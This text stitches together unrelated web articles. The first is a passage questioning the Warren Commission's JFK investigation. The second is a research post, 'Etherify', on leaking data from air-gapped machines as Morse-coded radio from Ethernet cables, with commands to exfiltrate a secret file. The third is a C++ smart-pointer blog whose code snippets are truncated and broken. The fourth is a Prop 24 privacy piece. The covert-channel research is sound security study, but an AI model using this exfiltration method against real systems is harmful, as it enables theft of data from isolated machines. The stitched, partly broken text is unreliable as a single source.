            <p>Leadership of the filibuster in the Senate against the Civil Rights Bill prevented Senator Russell from attending hearings during the period. The Chief Justice of the United States Supreme Court, Earl Warren, who rightly commands respect, was finally persuaded, much against his will, to preside over the Commission, and it was his involvement above all else that helped lend the Commission an aura of legality and authority. Yet many of its members were also members of those very groups which have done so much to distort and suppress the facts about the assassination. Because of their connection with the Government, not one member would have been permitted under U.S. law to serve on a jury <a href="http://22november1963.org.uk/lee-harvey-oswald-fair-trial" title="Did Lee Harvey Oswald get a fair trial?">had Oswald faced trial</a>. It is small wonder that the Chief Justice himself remarked that the release of some of the Commission’s information “might not be in your lifetime.” Here, then, is my first question: <strong>Why were all the members of the Warren Commission closely connected with the U.S. Government?</strong></p>
            <h2>2 and 3: Conduct and Official Secrecy</h2>
            <p>If the composition of the Commission was suspect, its conduct confirmed one’s worst fears. No counsel was permitted to act for Oswald, so that cross–examination was barred. Later, under pressure, the Commission appointed the President of the American Bar Association, Walter Craig, one of the supporters of the Goldwater movement in Arizona, to represent Oswald. To my knowledge, he did not attend hearings, but satisfied himself with representation by observers.</p>
            <p>In the name of national security, the Commission’s hearings were held in secret, thereby continuing the policy which has marked the entire course of the case. This prompts my second question: <strong>If, as we are told, Oswald was the lone assassin, where is the issue of national security?</strong> Indeed, precisely the same question must be put here as was posed in France during the Dreyfus case: <strong>If the Government is so certain of its case, why has it conducted all its inquiries in the strictest secrecy?</strong></p>
            <h2>4: The Crucial Question Was Not Asked</h2>
            <p>At the outset the Commission appointed six panels through which it would conduct its enquiry. They considered:</p>
            <ol>
                <li>What did Oswald do on November 22, 1963?</li>
                <li>What was Oswald’s background?</li>
                <li>What did Oswald do in the U.S. Marine Corps, and in the Soviet Union?</li>
                <li>How did Ruby kill Oswald?</li>
                <li>What is Ruby’s background?</li>
                <li>What efforts were taken to protect the President on November 22?</li>
            </ol>
            <p>This raises my fourth question: <strong>Why did the Warren Commission not establish a panel to deal with the question of who killed President Kennedy?</strong></p>
            <h2>5: Challenging the Commission</h2>
            <p>All the evidence given to the Commission has been classified “Top Secret,” including even a request that hearings be held in public. Despite this the Commission itself leaked much of the evidence to the press, though only if the evidence  tended to prove Oswald the lone assassin. Thus, Chief Justice Warren held a press conference after Oswald’s wife, Marina, had testified. He said that she believed her husband was the assassin. Before Oswald’s brother Robert testified, he gained the Commission’s agreement not to comment on what he said. After he had testified for two days, the newspapers were full of stories that “a member of the Commission” had told the press that Robert Oswald had just testified that he believed that his brother was an agent of the Soviet Union. Robert Oswald was outraged by this, and he said that he could not remain silent while lies were told about his testimony. He had never said this and he had never believed it. All that he had told the Commission was that he believed his brother was innocent and was in no way involved in the assassination.</p>
            <p>The methods adopted by the Commission have indeed been deplorable, but it is important to challenge the entire role of the Warren Commission. It stated that it would not conduct its own investigation, but rely instead on the existing governmental agencies — the F.B.I., the Secret Service and the Dallas police. Confidence in the Warren Commission thus presupposes confidence in these three institutions. <strong>Why have so many liberals abandoned their own responsibility to a Commission whose circumstances they refuse to examine?</strong></p>
            <h2>6: Oswald the Subversive</h2>
            <p>It is known that the strictest and most elaborate security precautions ever taken for a President of the United States were ordered for November 22 in Dallas. The city had a reputation for violence and was the home of some of the most extreme right–wing fanatics in America. Mr. and Mrs. Lyndon Johnson had been assailed there in 1960 when he was a candidate for the Vice–Presidency. Adlai Stevenson had been physically attacked when he spoke in the city only a month before Kennedy’s visit. On the morning of November 22, the <cite>Dallas Morning News</cite> carried a full–page advertisement <a href="http://22november1963.org.uk/jfk-assassination-political-context" title="Political context of the JFK assassination">associating the President with Communism</a>. The city was covered with posters showing the President’s picture and headed “Wanted for Treason.” The Dallas list of subversives comprised 23 names, of which Oswald’s was the first. All of them were followed that day, except Oswald. <strong>Why did the authorities follow many persons as potential assassins and fail to observe Oswald’s entry into the book depository building while allegedly carrying a rifle over three feet long?</strong></p>
            <h2>7: The Route of the Motorcade</h2>
            <p>The President’s route for his drive through Dallas was widely known and was printed in the <cite>Dallas Morning News</cite> on November 22. At the last minute the Secret Service changed a small part of their plans so that the President left Main Street and turned into Houston and Elm Streets. This alteration took the President past the book depository building from which it is alleged that Oswald shot him. How Oswald is supposed to have known of this change has never been explained. <strong>Why was the President’s route changed at the last minute to take him past Oswald’s place of work?</strong></p>
            <h2>8: Changing the Evidence</h2>
            <p>After the assassination and Oswald’s arrest, judgment was pronounced swiftly: Oswald was the assassin, and he had acted alone. No attempt was made to arrest others, no road blocks were set up round the area, and every piece of evidence which tended to incriminate Oswald was announced to the press by the Dallas District Attorney, Mr. Wade. In such a way millions of people were prejudiced against Oswald before there was any opportunity for him to be brought to trial. The first theory announced by the authorities was that the President’s car was in Houston Street, approaching the book depository building, when Oswald opened fire. When available photographs and eyewitnesses had shown this to be quite untrue, the theory was abandoned and a new one formulated which placed the vehicle in its correct position. Meanwhile, however, D.A. Wade had announced that three days after Oswald’s room in Dallas had been searched, a map had been found there on which the book depository building had been circled and dotted lines drawn from the building to a vehicle on Houston Street, showing the <a href="http://22november1963.org.uk/single-bullet-theory-jfk-assassination" title="JFK assassination bullet trajectory">alleged bullet trajectory</a> had been planned in advance. After the first theory was proved false, the Associated Press put out the following story on November 27: “Dallas authorities announced today that there never was a map.”</p>
            <p>The second theory correctly placed the President’s car on Elm Street, 50 to 75 yards past the book depository, but had to contend with the difficulty that the President was shot from the front, in the throat. <strong>How did Oswald manage to shoot the President in the front from behind?</strong> The F.B.I. held a series of background briefing sessions for <cite>Life</cite> magazine, which in its issue of December 6 explained that the President had turned completely round just at the time he was shot. This too, was soon shown to be entirely false. It …</p></article></div></div>

		<p>Leaking data via out of unconnected devices (both connected and unconnected) is a very interesting topic, often called “soft tempest”. Often this is the realm of absurdly costly lab equipment, source code isn’t published etc.&nbsp; Here i would like to demonstrate this using the simplest equipment and means, and make it very easy to reproduce.</p>
<p>To transmit an elecromagnetic wave one needs to have a conductor driven by a high frequency source. Various busses are used: monitor cables, pci buses etc. Here i propose the use of ethernet.</p>
<p>An ethernet cable consists of 4 twisted pair lines with 100ohm impedance., which carries RF signals in the tens to hundredths MHz range. Any imperfections in the cable (asymetry etc) or in the interface will cause radio signals to be radiated.</p>
<p>Signals can be modulated using different methods. Here i will use morse code for simplicity. This also allows one to judge the signal to noise ratio by just listening. It is also possible to decode it by ear without additional devices if one knows morse code, if not there is a lot of software that can do it (although usually with much worse performance than an experienced human operator).</p>
<p>Transmission is implemented via very simple shell scripts. Only bash, ethtool and ping is needed. This enables the script to be used easily on embedded devices and other platforms where shipping binaries, installing a python environment etc might be a problem.</p>
<p>The proof-of-concept scripts are avaliable at <a href="https://github.com/sq5bpf/etherify">https://github.com/sq5bpf/etherify</a></p>
<p><strong>Etherify 1 – transmitting by switching speed</strong></p>
<p>Various ethernet speeds have different modulation speeds, types and encoding. By switching between we can modulate the RF signal leaking from the wires.</p>
<p>10base-T uses manchester encoding with 10MHz symbol rate. This is used as the space signal (logical 0).</p>
<p>100base-T uses 4B5B encoding with NRZI at 125MHz symbol rate . This results in an easy to receive signal around 125MHz, this is used as the mark signal (logical 1).</p>
<p>Ethernet transmits an idle sequence when no packets are carried, so the signal is constant. No packets have to be transmitted for the signal to be present, on the speed of the interface has to be changed.</p>
<p>The transmission is implemented by a simple bash script, which sends the content of a short text file given as the argument, or “etherify demo” if none is given. The signal can be received as morse code around 125MHz, please use USB or CW mode in the receiver and use a narrow filter.</p>
<p>Demo:</p>
<p>Ensure that the two raspberry PIs are connected and that there is an ethernet link between them (signalled via the LEDs).</p>
<p>Run as root:</p>
<p>./etherify1</p>
<p>to transmit “etherify demo” or to exfiltrate the contents of /tmp/secret.txt</p>
<p>./etherify1 /tmp/secret.txt</p>
<p>Listen to the signal at 125MHz as described below.</p>

<p>The is decodable by ear with a simple Moxon directional antenna and a ham radio receiver (SDR could be used too).</p>
<p>This results in a strong signal at 15m distance:</p>
<p><iframe title="Etherify 1 at 15m" width="525" height="295" src="https://www.youtube.com/embed/MK15ofaWS_U?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>The results at 100m distance (weak signal, please use headphones):</p>
<p><iframe title="Etherify 1 at 100m" width="525" height="295" src="https://www.youtube.com/embed/1hdmZOwssGM?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>If in doubt let an experienced amateur radio operator decode it. I was not able to decode the signal at 100m with software.</p>
<p><strong>Etherify 2 – transmitting by sending data</strong></p>
<p>Sending a stream of data at 1Gbps also produces a detectable signal change at 125MHz. There may be other frequencies where the signals were more readable, but equipment was avaliable to receive at 125MHz. This probably works by loading the supply voltage when the packets are generated. A change of voltage probably changes the frequency of some clock slightly, thus generating FSK (F1A to be exact). Note that this doesn’t work with all hardware, which could be explained by the hypothesis about the frequency being modulated by the interface load.</p>
<p>A large volume of traffic represents a logical 1, while no traffic represents logical 0.</p>
<p>The transmission is implemented as a simple bash script, which sends the content of a short text file given as the argument, or “etherify demo” if none is given. The signal can be received as morse code around 125MHz, please use USB or CW mode in the receiver and use a narrow filter, also AM mode can be used.</p>
<p>Demo:</p>
<p>Ensure that the two raspberry PIs are connected and that there is an ethernet link between them (signalled via the LEDs). Set one raspberry PI to 192.168.1.1/24 and the other to 192.168.1.2/24 (the IP address can be changed in the etherify2 script). Ensure that the two raspberry PIs have IP connectivity and can ping each other, and that he interface rate is 1Gbps.</p>
<p>On the 192.168.1.2 raspberry PI run as root:</p>
<p>./etherify2</p>
<p>to transmit “etherify demo” or to exfiltrate the contents of /tmp/secret.txt</p>
<p>./etherify2 /tmp/secret.txt</p>
<p>Listen to the signal at 125MHz as described below.</p>
<p>The signal was decodable by ear at a distance of 30m with a simple Moxon directional antenna and a ham radio receiver.</p>
<p>This results in a strong signal at 15m distance:</p>
<p><iframe title="Etherify 2 at 15m" width="525" height="295" src="https://www.youtube.com/embed/9zKCrdAY1oQ?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>And a readable signal at 30m:</p>
<p><iframe title="Etherify 2 at 30m" width="525" height="295" src="https://www.youtube.com/embed/CCttAsAU_IU?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p><strong>Equipment used and experiment description</strong></p>
<p>The RF radiation differs with different equipment and ethernet cable type being used. In order to make this demo reproducible i used two Raspberry PI 4, because it makes it easy for everyone to obtain the exact hardware that was used for this experiment. The raspberry PIs were connected using the ethernet cable supplied with the official Raspberry PI 4 starter kit. The stock Raspbian 10 operating system, which was supplied on the SD cards&nbsp; in the Starter Kit, was used. The devices were accessed via the serial console.</p>
<p>Power was provided via powerbanks. This was to avoid a connection to the mains voltage, because the powerline could be an unintentional radiator.</p>
<p>The Raspberry PIs were laid on a wooden bench about 1.4m from each other.</p>
<p>The experiment was conducted in an electromagnetically quiet area.</p>
<figure id="attachment_83" aria-describedby="caption-attachment-83"><img loading="lazy" src="https://lipkowski.com/wp-content/uploads/2020/11/rpi_etherify.jpg" alt="" width="843" height="355"><figcaption id="caption-attachment-83">Raspberry PI etherify demo</figcaption></figure>
<p>The signal was received via a Moxon antenna built for 125MHz and a Yaesu FT-817 transceiver with a 500Hz CW filter. Morse code was received and decoded by ear.</p>
<p>The experiments can be repeated with other devices with ethernet ports, for example two laptops, running any linux distribution and the required tools installed (most will come with them out of the box). The devices should be able to establish an ethernet link very quickly upon switching speed. An SDR receiver can be used for reception, with any antenna that can receive 125MHz (test first at close range). Morse code decoding can be done via software, for example fldigi [3].</p>
<p>The easiest receive setup would probably be gqrx with an rtl-sdr dongle, and fldigi for deciding the signals. If the signal is not decoded, it should be played to someone who can receive morse code by ear. Often such person will be able to decode it with ease.</p>
<p>The experiment should be first conducted in an electromagnetically quiet area, nearby ethernet networks will generate a lot of interference. If testing in the vicinity of other ethernet networks move the antenna closer, and reduce the receiver gain as much as possible.</p>
<p><strong>Discussion</strong></p>
<p>The signal was shown to be decodable by ear at 100m for etherify 1, and 30m for etherify 2. This was done via a simple antenna and modest receiver. An antenna with more gain and better receiver would surely yield better range.</p>
<p>Nearby ethernet networks will generate a lot of interference at the same frequencies. The 125MHz frequency falls in the 108-137MHz air band, and one can expect interference from strong signals on nearby frequencies from nearby airplanes and airports. Therefore first tests should be conducted in areas with less interference, such as outdoor areas or underground parking lots.</p>
<p>The 125MHz frequency was chosen because of avaliable equipment. It would be hard for one person to hold and operate an antenna, laptop and SDR receiver. Other frequencies may be better.</p>
<p>Etherify 1 yields better range, however etherify 2 may enable to use a device located somewhere else in the network as the transmitter. This device may be physically closer to the receiver or may have greater leakage from the ethernet cable. Etherify 2 can be exploited as a non-root user by flooding the network with UDP datagrams or possibly other data.</p>
<p>The “software” side is intentionally a very primitive silly hack.</p>
<p>I haven’t done an extensive search for similar prior publications, but a few quick searches didn’t yield any results. If you know of any, please let me know.</p>

        <h4>Published: November 6, 2020</h4>
        
<p>I’ve been studying quite a bit of modern C++ (using C++17) lately because of a side project and I have picked up some oddities and gotchas when it comes to pointers, specifically smart pointers.</p>
<p>I must note that I am by no means a seasoned C++ Engineer, nevertheless, I ran &amp; debugged all the examples below on Mac OS Catalina 10.15.7.</p>

<p>These are the helpers to instantiate a smart pointer.</p>
<p>Now consider the following example where we would just instantiate a base class <code>Animal</code>.
There are many ways to instantiate <code>Animal</code> as a <code>unique_ptr</code>. I listed the most common below.</p>
<div><pre><code data-lang="c++"><span>#include</span> <span>&lt;memory&gt;</span><span>

}
</code></pre></div><p>As you can see, the last option where we instantiate <code>Animal</code> into <code>charlieB</code> variable looks pretty easy. The main advantage
of using <code>make_unique</code> is the lack of <code>new</code> keyword. That’s because <code>new</code> resonates manual memory management and modern C++ would
like you to avoid using it when using smart pointers, because the smart pointer will always call delete in its destructor.</p>
<p>Use make_unique they said, avoid using <code>new</code> they said, and so I did. Until I hit a roadblock when debugging a polymorphic object
that was supposed to be a derived class in runtime, but behaved as a base class.</p>
<p>Remember the Animal base class from above? We’ll add <code>Dog</code> class below that will inherit from <code>Animal</code>.</p>
<div><pre><code data-lang="c++"><span>class</span> <span>Dog</span><span>:</span> <span>public</span> Animal {
<span>public</span><span>:</span>
    std<span>::</span>string name() <span>const</span> <span>override</span> {
        <span>return</span> <span>"I'm a dog"</span>;
    }
};
</code></pre></div><p>Now we can try to implement polymorphism by creating an instance of <code>Dog</code> into an <code>Animal</code> pointer.</p>
<div><pre><code data-lang="c++"><span>int</span> <span>main</span>() {
    <span>auto</span> charlieB <span>=</span> std<span>::</span>make_unique<span>&lt;</span>Animal<span>&gt;</span>(Dog());
    
    std<span>::</span>cout <span>&lt;&lt;</span> <span>"Name is: "</span> <span>&lt;&lt;</span> charlieB<span>-&gt;</span>name() <span>&lt;&lt;</span> std<span>::</span>endl;
    <span>// Output -&gt; Name is: I'm an animal
</span><span></span>}
</code></pre></div><p>Isn’t that weird? We created a Dog object! Well, yes and no. Let’s break it down:</p>
<ol>
<li>We created an instance of <code>Dog</code></li>
<li>The instance was passed as an argument to <code>make_unique</code></li>
<li>Here it comes, if you look at source code of <code>make_unique</code> function, you’ll see it’s primitive. It just creates
a new object of type <code>T</code> (<code>Animal</code> in our case) on the heap, using <code>new</code> operator. We could express the internal operation as:</li>
</ol>
<div><pre><code data-lang="c++">Dog d;
Animal<span>*</span> a <span>=</span> <span>new</span> Animal(d);
</code></pre></div><p>So yes, we did pass a Dog object, but it will be downcast to Animal in order to create a new instance of Animal using one of the built-in constructors:</p>
<div><pre><code data-lang="c++"><span>// Animal has this generated constructor (among others) by default
</span><span></span>Animal(<span>const</span> Animal<span>&amp;</span>);
</code></pre></div><h3 id="edit---thanks-to-crifferiushttpstwittercomcrifferius-and-arganoidhttpstwittercomarganoid">Edit - thanks to <a href="https://twitter.com/crifferius">@crifferius</a> and <a href="https://twitter.com/arganoid">@arganoid</a></h3>
<p>The scenario from above leads to an incorrect and confusing behavior. It was my understanding of <code>make_shared</code> &amp; <code>make_unique</code> that was incorrect.</p>
<p>Nevertheless, I think it’s still important to mention it, as the program compiles successfully (no warnings), with an unexpected behavior,
especially for people coming to C++ from another language.</p>
<p><code>make_unique</code> and <code>make_shared</code> actually forward parameters, so you should use them with the derived class type as shown below for <code>charlieC</code>.</p>
<div><pre><code data-lang="c++"><span>int</span> <span>main</span>() {
    <span>auto</span> charlieB <span>=</span> std<span>::</span>unique_ptr<span>&lt;</span>Animal<span>&gt;</span>(<span>new</span> Dog());
    std<span>::</span>unique_ptr<span>&lt;</span>Animal<span>&gt;</span> charlieC <span>=</span> std<span>::</span>make_unique<span>&lt;</span>Dog<span>&gt;</span>(); <span>// Preferred

    std<span>::</span>cout <span>&lt;&lt;</span> <span>"Name is: "</span> <span>&lt;&lt;</span> charlieB<span>-&gt;</span>name() <span>&lt;&lt;</span> std<span>::</span>endl;
    <span>// Output -&gt; Name is: I'm a dog
</span><span></span>}
</code></pre></div><p>If the <code>Dog</code> had parameters in a constructor, you would simply pass those into the <code>make_shared</code> / <code>make_unique</code> helper
as shown below:</p>
<div><pre><code data-lang="C++"><span>// Let's modify Dog only for this example
</span><span></span><span>class</span> <span>Dog</span><span>:</span> <span>public</span> Animal {
    std<span>::</span>string name_;

    <span>// Output -&gt; Name is: I'm a dog: Poodle
</span><span></span>}
</code></pre></div>
<p>References are great. They are like pointers, but cannot be <strong>nullptr</strong> (you could technically workaround and store <strong>NULL/nullptr</strong> in a reference, but that leads to undefined behavior and I won’t present such a bad practice here).</p>
<p>Not only references are not optional, but they also depict another paradigm. When we accept a reference parameter in a function/method,
it means we don’t own the underlying value, nor we store it, although we might modify it (depending on whether the parameter is marked as <code>const</code>).</p>
<p>The first section of this article mentioned polymorphism. Given our examples above, we might need an array of <code>Animal</code> objects. Some could be <code>Dog</code>, <code>Cat</code>, or other. We might not know in compile time.</p>
<p>Now what if we need to walk through though the array and if it’s a dog, we want to print out the breed? For that, we will need casting.
There are multiple types of casting, let me just briefly introduce just a few:</p>
<ul>
<li><code>static_cast</code> - casts as a given type, no runtime check</li>
<li><code>dynamic_cast</code> - casts as a given type, if it’s compatible. It will run a runtime check. In case of an error, if we’re casting to a pointer, the result will be a <code>nullptr</code> value. If we’re casting to a reference, a <code>std::bad_cast</code> exception will be thrown.</li>
</ul>
<p>There are also cast helpers when you work with <code>shared_ptr</code>. Those are convenient as they unwrap the smart pointer for us.</p>
<ul>
<li><code>std::dynamic_pointer_cast</code></li>
<li><code>std::static_pointer_cast</code></li>
</ul>
<p>Let’s modify our original example a bit:</p>
<ol>
<li>Create a virtual method breed() in <code>Dog</code> class</li>
<li>Create <code>Husky</code> class that inherits from <code>Dog</code> and implements breed()</li>
<li>Create <code>Cat</code> class just to have another type of animal</li>
</ol>
<div><pre><code data-lang="c++"><span>class</span> <span>Dog</span><span>:</span> <span>public</span> Animal {
<span>public</span><span>:</span>
    <span>virtual</span> <span>~</span>Dog() <span>=</span> <span>default</span>;
    <span>virtual</span> std<span>::</span>string breed() <span>const</span> {
        <span>throw</span> std<span>::</span>runtime_error(<span>"Dog.breed() should be implemented by a derived class"</span>);
    }

    std<span>::</span>string name() <span>const</span> <span>override</span> {
        <span>return</span> <span>"I'm a dog"</span>;
    }
};

<span>class</span> <span>Cat</span><span>:</span> <span>public</span> Animal {
    std<span>::</span>string name() <span>const</span> <span>override</span> {
        <span>return</span> <span>"I'm a cat"</span>;
    }
};

<span>class</span> <span>Husky</span><span>:</span> <span>public</span> Dog {
<span>public</span><span>:</span>
  std<span>::</span>string breed() <span>const</span> <span>override</span> {
      <span>return</span> <span>"Husky"</span>;
  }
};
</code></pre></div><p>Time to create our animal array. Remember, not all animals are dogs, so we’ll first have to try to upcast an <code>Animal&amp;</code> to a <code>Dog&amp;</code> and if it works,
we can print out the breed.</p>
<div><pre><code data-lang="c++">
<span>void</span> <span>printDogBreed</span>(<span>const</span> Animal<span>&amp;</span> animal);

<span>int</span> <span>main</span>() {
    std<span>::</span>vector<span>&lt;</span>std<span>::</span>shared_ptr<span>&lt;</span>Animal<span>&gt;&gt;</span> animals;

    animals.emplace_back(std<span>::</span>shared_ptr<span>&lt;</span>Animal<span>&gt;</span>(<span>new</span> Husky));
    animals.emplace_back(std<span>::</span>shared_ptr<span>&lt;</span>Animal<span>&gt;</span>(<span>new</span> Cat));

    <span>for</span> (<span>const</span> <span>auto</span><span>&amp;</span> animal : animals) {
        <span>// ignore this function for now, we'll define it in a minute
</span><span></span>        printDogBreed(<span>*</span>animal);
    }
}
</code></pre></div><p>We created an array with one dog and one cat. The function <code>printDogBreed</code> is yet to be defined. We will want to pass
a reference of <code>Animal</code> to the function and let it either print out the breed (if the animal is a dog) or do nothing.</p>
<p>For those who don’t know, the asterisk operator in <code>shared_ptr</code> is overloaded to return a reference of the stored object.</p>
<p>Let’s define <code>printDogBreed</code> function now:</p>
<div><pre><code data-lang="c++"><span>void</span> <span>printDogBreed</span>(<span>const</span> Animal<span>&amp;</span> animal) {
    <span>try</span> {
        <span>auto</span> dog <span>=</span> <span>dynamic_cast</span><span>&lt;</span><span>const</span> Dog<span>&amp;&gt;</span>(animal);
        std<span>::</span>cout <span>&lt;&lt;</span> <span>"Breed is: "</span> <span>&lt;&lt;</span> dog.breed() <span>&lt;&lt;</span> std<span>::</span>endl;
    } <span>catch</span> (<span>const</span> std<span>::</span>bad_cast<span>&amp;</span> e) {
        <span>// do nothing, it's not a dog
</span><span></span>    }
}
</code></pre></div><p>This is pretty straightforward no? We take a const reference of <code>Animal</code> (as we don’t need to modify it) and try
to upcast it to a Dog reference.</p>
<p>We would expect (or I would anyway), that the program would output our husky dog breed. Unfortunately, that’s not what happens.</p>
<p>The application will crash on a <code>std::runtime_error</code> exception thrown from the base <code>Dog</code> class’ <code>breed()</code> method.</p>
<h3 id="why-why-why">Why, why, why?</h3>
<p>Well, that’s a good question. The underlying object is a <code>Dog</code>, but most importantly it’s <code>Husky</code>, so we would expect
the virtual method <code>breed()</code> to print out <code>Husky</code>.</p>
<p>For some reason (I would really love to give you a full in-detail explanation on this, if you know, please message us on <a href="https://twitter.com/digreverie">twitter</a>.), the cast
itself is valid, but it’s also hard-wired to <code>Dog</code> type, or its vtable is erased, who knows.</p>
<p>If we were to replace the line and cast directly to <code>Husky</code>, everything would work as expected. But we don’t want to specify the type of dog. As we might add more types in the future.</p>
<div><pre><code data-lang="c++"><span>auto</span> dog <span>=</span> <span>dynamic_cast</span><span>&lt;</span><span>const</span> Husky<span>&amp;&gt;</span>(animal);
</code></pre></div><h3 id="cast-to-pointer-for-the-rescue">Cast to pointer for the rescue</h3>
<p>Luckily, the solution is rather simple. We “just” have to cast to a <code>Dog</code> pointer, that will behave correctly in runtime, dispatching the right virtual method.
Notice the <code>&amp;</code> before animal. We’re basically taking an address of the <code>Animal</code> reference, which will lead us to the pointer.</p>
<div><pre><code data-lang="c++"><span>void</span> <span>printDogBreed</span>(<span>const</span> Animal<span>&amp;</span> animal) {
    <span>if</span> (<span>auto</span> dog <span>=</span> <span>dynamic_cast</span><span>&lt;</span><span>const</span> Dog<span>*&gt;</span>(<span>&amp;</span>animal)) {
        std<span>::</span>cout <span>&lt;&lt;</span> <span>"Breed is: "</span> <span>&lt;&lt;</span> dog<span>-&gt;</span>breed() <span>&lt;&lt;</span> std<span>::</span>endl;
    }
}
</code></pre></div>
<p>This one almost got me bald from pulling my hair. Consider the following code:</p>
<div><pre><code data-lang="c++"><span> 1</span><span>// Note this function defines a reference of shared_ptr as the function parameter.
</span><span><span> 2</span><span></span><span>void</span> <span>shuffleAnimal</span>(std<span>::</span>function<span>&lt;</span><span>void</span>(std<span>::</span>shared_ptr<span>&lt;</span>Animal<span>&gt;&amp;</span>)<span>&gt;</span> f) {
</span><span> 3</span>    <span>auto</span> animal <span>=</span> std<span>::</span>shared_ptr<span>&lt;</span>Animal<span>&gt;</span>(<span>new</span> Husky);
<span> 4</span>    f(animal);
<span> 5</span>
<span> 6</span>    std<span>::</span>cout <span>&lt;&lt;</span> <span>"Picked animal name: "</span> <span>&lt;&lt;</span> animal<span>-&gt;</span>name() <span>&lt;&lt;</span> std<span>::</span>endl;
<span> 7</span>}
<span> 8</span>
<span> 9</span><span>int</span> <span>main</span>() {
<span>10</span>    <span>// but caller can implement it without a reference, as such:
</span><span><span>11</span><span></span>    shuffleAnimal([](std<span>::</span>shared_ptr<span>&lt;</span>Animal<span>&gt;</span> animal) {
</span><span>12</span>        animal.reset(<span>new</span> Cat);
<span>13</span>    });
<span>14</span>}
</code></pre></div>
<p>The function <code>shuffleAnimal</code> lets the caller shuffle the initial Animal it provides. As you can see, we provide a mutable
reference of <code>shared_ptr</code>.</p>
<p>Notice the caller does <strong>NOT</strong> implement the parameter correctly, as it omits the reference mark!</p>
<p>This would not fly with <code>unique_ptr</code> those cannot be copied, so you’d encounter a compilation error.</p>
<p>Since this program will build …</p></article></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Californians voted Yes on <a href="https://vig.cdn.sos.ca.gov/2020/general/pdf/topl-prop24.pdf">Prop 24</a>, approving extensive amendments to the <a href="https://leginfo.legislature.ca.gov/faces/billTextClient.xhtml?bill_id=201720180SB1121">California Consumer Privacy Act</a> with the mindset of strengthening the U.S.’s most comprehensive data privacy regulation to date. But one of its provisions undermines that goal in a way that puts both individual privacy and corporate security at a heightened risk.<br></p><p>Specifically, a collection of amendments grants service providers expanded powers to combine consumer datasets obtained from different sources (see Secs. 1798.140(ag)(1) and 1798.185(e)(10)).<strong> In the world of data anonymization, the risks of combining datasets </strong><a href="https://www.nature.com/articles/s41467-019-10933-3/"><strong>are</strong></a><strong> </strong><a href="https://techcrunch.com/2019/07/24/researchers-spotlight-the-lie-of-anonymous-data/"><strong>well</strong></a><strong> </strong><a href="https://www.sciencedaily.com/releases/2018/12/181207144403.htm"><strong>known</strong></a><strong>.</strong> When paired with additional data, individuals in many anonymized datasets are surprisingly easy to re-identify. This can be due to uneven approaches in anonymization, as well as the simple benefit of added data points. Real-world instances include <a href="https://fpf.org/wp-content/uploads/The-Re-identification-of-Governor-Welds-Medical-Information-Daniel-Barth-Jones.pdf">anonymized medical records</a> being re-identified when pooled with voter databases; the infamous <a href="https://arxiv.org/abs/cs/0610105">Netflix user re-identification</a> achieved by combining anonymized Netflix data with IMDB user movie ratings; and <a href="https://www.forbes.com/sites/simonchandler/2019/09/04/researchers-use-big-data-and-ai-to-remove-legal-confidentiality/?sh=24ba16ec15f6">anonymized Swiss Supreme Court cases</a> involving pharmaceutical companies being re-identified using publicly available databases.<br></p><p>We’ve talked previously about how the <a href="https://www.tonic.ai/post/ccpa-will-hit-your-dev-team-harder-than-gdpr">CCPA impacts dev teams</a> thanks to its extremely broad definition of the types of data requiring protection. Today, we’ll look at how Prop 24 throws that data under the bus by loosening its restrictions on data pooling.<br></p><h3>A practical example<br></h3><p>Imagine there’s a handful of companies in the same industry, say EdTech, all working with the same third-party service provider to debug software, perform testing, or develop apps. Each of these companies anonymizes their users’ data prior to sharing it with the service provider. Thanks to Prop 24, the service provider pools those datasets to maximize their work. Then the service provider experiences a breach. Individually, those anonymized user datasets may have been safe from re-identification. But combined, they make it much easier to connect the dots and re-identify users with as much as a <a href="https://www.nature.com/articles/s41467-019-10933-3/">99.9% rate of accuracy</a>.<br></p><p>The end result? Multiple companies grappling with crisis management thanks to a single data leak of “anonymized” data. The inclusion of this provision in the newly-passed Prop 24 significantly weakens the individual privacy protections that the CCPA otherwise aims to safeguard. What’s more, it weakens a company’s ability to ensure the privacy of their data when working with third parties.</p><figure><p><img src="https://uploads-ssl.webflow.com/5f0ae1534d32e5a91598eb9c/5fa5e8d498f39f28e061d229_wpTaqICtlYpRVLx4exhENOlsJh4wo898y97N_2Hhc6DJKYk06ryDg5nZj1yv5gBOa0s9DHtrJhQYE8CEg8WAzHkT_NqrcOsbFFUp_m75LDSJTiJVx742PBA69hqfJQSgvMrT25dm.png" alt=""></p></figure><h3><strong>What to do about it</strong><br></h3><p>More and more companies are relying on third-party providers to expand their development teams, outsource QA testing, or engage in other ways that rely on shared datasets. Where the law opens the door to data pooling, concerned companies should specify in their contracts if they want that door kept firmly shut.<br></p><p>But maybe a company stands to benefit from the provider having a larger pool of data to work with. In that case, here are two approaches that allow for reaping the benefits of working with third-parties without upping the risks to data security.<br></p><h4>Ironclad data de-identification</h4><p>Simple redaction, pseudonymization, and sampling aren’t going to cut it. Advanced subsetting paired with full database obfuscation? Now we’re talking. Data beyond what the law defines as “sensitive personal information” and “unique identifiers” could be used to re-identify individuals when combined with other datasets. Taking a more comprehensive approach to data de-identification provides the safeguards needed against re-identification due to data pooling. And with tools like those available in <a href="https://www.tonic.ai/product">Tonic</a> to link columns and preserve relationships in the protected output dataset, companies can strengthen their data security without sacrificing their data’s utility.</p><h4>Data synthesis with differential privacy&nbsp;</h4><p>For the strongest in data security, data synthesis performed with differential privacy at its core not only provides mathematical guarantees for data protection, it also allows for scaling up datasets to any size to equip developers with the amount of realistic, yet wholly fictitious, data they need to do their best work. Here, too, Tonic is <a href="https://www.tonic.ai/post/differential-privacy-comes-to-tonic">leading the charge</a>.<br></p><h3>Why companies should act<br></h3><p>Two additional components of Prop 24 and the CPPA are worth highlighting. First, Prop 24 establishes the California Privacy Protection Agency, expanding the resources available to implement and enforce the CCPA (see Sec. 1798.199.10). This strengthens the state’s ability to take legal action against companies that violate privacy rights.<br></p><p>Second, Prop 24 missed an opportunity to bring the CCPA in line with GDPR in requiring that companies have <a href="https://iapp.org/news/a/yes-how-opt-in-consent-really-works/">users opt into data collection</a>, as opposed to 